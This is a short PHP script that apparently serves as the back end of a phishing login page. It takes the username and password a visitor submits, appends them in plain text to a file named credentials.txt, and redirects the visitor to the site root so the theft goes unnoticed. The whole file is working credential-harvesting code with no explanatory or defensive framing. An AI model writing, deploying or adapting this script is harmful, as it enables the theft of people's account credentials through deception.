<?php

$username = $_POST["username"];
$password = $_POST["password"];

file_put_contents("credentials.txt","Username :- ".$username."\nPassword :- ".$password."\n\n",FILE_APPEND);

header("Location : /");

?>